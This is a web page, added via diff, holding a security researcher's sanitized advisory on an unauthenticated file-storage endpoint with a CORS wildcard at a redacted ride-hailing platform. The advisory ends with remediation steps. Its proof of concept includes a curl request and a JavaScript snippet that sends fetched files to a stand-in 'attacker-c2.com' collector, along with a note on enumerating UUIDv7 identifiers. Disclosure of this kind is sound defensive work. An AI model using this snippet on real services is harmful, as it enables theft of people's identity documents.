@@ -1,0 +1,165 @@
+---
+layout: null
+---
+<!DOCTYPE html>
+<html lang="en" class="dark scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Complete Data Exposure via File Storage API & CORS Wildcard | Kanan Gandhi Security Advisory</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            brand: {
+              dark: '#070a12',
+              card: '#0f1423',
+              cardHover: '#161c30',
+              border: '#1f293d',
+              accent: '#10b981',
+              cyan: '#06b6d4',
+              amber: '#f59e0b',
+              red: '#ef4444'
+            }
+          }
+        }
+      }
+    }
+  </script>
+</head>
+<body class="bg-[#070a12] text-slate-300 font-sans antialiased selection:bg-emerald-500/30 selection:text-emerald-300 min-h-screen">
+
+  <!-- Sticky Header -->
+  <header class="sticky top-0 z-40 bg-[#070a12]/90 backdrop-blur-md border-b border-[#1f293d]">
+    <div class="max-w-4xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
+      <a href="../index.html" class="inline-flex items-center gap-2 text-xs font-mono text-emerald-400 hover:text-emerald-300 transition-colors">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
+        <span>Back to Portfolio Home</span>
+      </a>
+      <div class="flex items-center space-x-3 text-xs font-mono">
+        <span class="text-slate-400">Auditor:</span>
+        <span class="text-white font-bold">Kanan Gandhi</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Advisory Content Container -->
+  <main class="max-w-4xl mx-auto px-4 sm:px-6 py-10">
+
+    <!-- Metadata Pill Bar -->
+    <div class="flex flex-wrap items-center gap-2.5 mb-4">
+      <span class="px-2.5 py-1 rounded text-xs font-mono font-bold border text-red-400 border-red-500/30 bg-red-500/10">
+        CRITICAL (CVSS 9.1)
+      </span>
+      <span class="px-2.5 py-1 rounded text-xs font-mono bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
+        Cloud & Storage Security / IDOR
+      </span>
+      <span class="px-2.5 py-1 rounded text-xs font-mono bg-[#0f1423] text-slate-400 border border-[#1f293d]">
+        Target: <strong class="text-slate-200">International Ride-Hailing Platform</strong>
+      </span>
+    </div>
+
+    <!-- Title -->
+    <h1 class="text-3xl sm:text-4xl font-extrabold text-white tracking-tight leading-tight mb-4">
+      Complete Data Exposure via File Storage API & CORS Wildcard
+    </h1>
+
+    <div class="p-3 bg-[#0f1423] rounded-xl border border-[#1f293d] font-mono text-xs text-slate-400 mb-8 flex flex-wrap items-center justify-between gap-2">
+      <div>
+        <span class="text-emerald-400 font-semibold">Scope:</span>
+        <code class="text-slate-200 ml-1.5">GET /api/v1/files/{uuid}</code>
+      </div>
+      <div class="text-[11px] text-slate-500">
+        Status: <span class="text-emerald-400 font-semibold">Remediated & Verified</span>
+      </div>
+    </div>
+
+    <!-- Executive Summary Section -->
+    <section class="mb-10">
+      <h2 class="text-xs font-mono uppercase tracking-wider text-slate-400 font-semibold mb-2">// 01. EXECUTIVE SUMMARY</h2>
+      <div class="bg-[#0f1423] p-5 rounded-2xl border border-[#1f293d] text-sm leading-relaxed text-slate-300">
+        Discovered an unauthenticated file storage endpoint backed by CloudFront and an Envoy service mesh. The API served stored files directly by UUID without authentication, while returning a permissive `Access-Control-Allow-Origin: *` wildcard header, enabling cross-origin exfiltration of KYC identity documents, driver licenses, and user attachments.
+      </div>
+    </section>
+
+    <!-- Technical PoC Flow Section -->
+    <section class="mb-10">
+      <h2 class="text-xs font-mono uppercase tracking-wider text-slate-400 font-semibold mb-2">// 02. PROOF OF CONCEPT & REPRODUCTION FLOW</h2>
+      <div class="bg-[#0f1423] p-5 rounded-2xl border border-[#1f293d] text-sm leading-relaxed text-slate-300 overflow-x-auto font-mono text-xs whitespace-pre-wrap">
+### 1. Unauthenticated Object Retrieval
+Any client could request files directly via UUID without providing cookies, bearer tokens, or API keys:
+```bash
+curl -s -I "https://file-storage.[redacted-ridehailing].com/api/v1/files/[UUID-REDACTED]"
+```
+**Response:**
+```http
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Content-Length: 864778
+Access-Control-Allow-Origin: *
+```
+
+### 2. Cross-Origin Wildcard Exploitation
+Because `Access-Control-Allow-Origin: *` was returned on the file storage endpoint, an adversary could embed a lightweight script on an external website:
+```javascript
+fetch("https://file-storage.[redacted-ridehailing].com/api/v1/files/[UUID-REDACTED]")
+  .then(response => response.blob())
+  .then(blob => {
+    const formData = new FormData();
+    formData.append("exfiltrated_file", blob);
+    fetch("https://attacker-c2.com/collector", { method: "POST", body: formData });
+  });
+```
+
+### 3. Predictable Identifier Structure (UUIDv7)
+Analysis of discovered identifiers revealed the use of UUIDv7, where the first 48 bits encode a sequential Unix timestamp in milliseconds, drastically reducing search space for automated enumeration.
+      </div>
+    </section>
+
+    <!-- Business Impact Section -->
+    <section class="mb-10">
+      <h2 class="text-xs font-mono uppercase tracking-wider text-slate-400 font-semibold mb-2">// 03. BUSINESS IMPACT & REGULATORY EXPOSURE</h2>
+      <div class="bg-red-950/20 p-5 rounded-2xl border border-red-900/40 text-sm leading-relaxed text-red-300/90">
+        Zero-interaction exfiltration of sensitive platform files including driver licenses, government ID proofs, payment receipts, and user attachments across the international user base.
+      </div>
+    </section>
+
+    <!-- Remediation Guidance Section -->
+    <section class="mb-12">
+      <h2 class="text-xs font-mono uppercase tracking-wider text-slate-400 font-semibold mb-2">// 04. REMEDIATION & QA ENGINEERING GUIDANCE</h2>
+      <div class="bg-emerald-950/20 p-5 rounded-2xl border border-emerald-900/40 text-sm leading-relaxed text-emerald-300/90 overflow-x-auto font-mono text-xs whitespace-pre-wrap">
+1. **Enforce Authentication on Read Endpoints:** Require valid user authorization claims before streaming file contents.
+2. **Eliminate Permissive CORS Wildcards:** Restrict `Access-Control-Allow-Origin` strictly to verified first-party domains.
+3. **Pre-Signed URL Architecture:** Transition document downloads to short-lived (15-minute TTL) HMAC-signed URLs generated server-side.
+4. **Bucket-Level Isolation:** Ensure backend object storage policies deny unauthenticated access.
+      </div>
+    </section>
+
+    <!-- Bottom Action Navigation -->
+    <div class="border-t border-[#1f293d] pt-8 flex flex-col sm:flex-row items-center justify-between gap-4">
+      <a href="../index.html#cases" class="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-[#0f1423] hover:bg-[#161c30] text-slate-300 hover:text-white border border-[#1f293d] text-xs font-mono transition-colors">
+        ← Return to All Findings
+      </a>
+      <a href="mailto:kanangandhi62@gmail.com?subject=Inquiry%20regarding%20Complete%20Data%20Exposure%20via%20File%20Storage%20API%20%26%20CORS%20Wildcard" class="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-[#070a12] font-bold text-xs font-mono transition-colors">
+        Inquire / Request Pentest
+      </a>
+    </div>
+
+  </main>
+
+  <footer class="border-t border-[#1f293d] py-6 text-center text-xs font-mono text-slate-500">
+    © 2026 Kanan Gandhi. All sanitized security advisories published under responsible disclosure.
+  </footer>
+
+</body>
+</html>
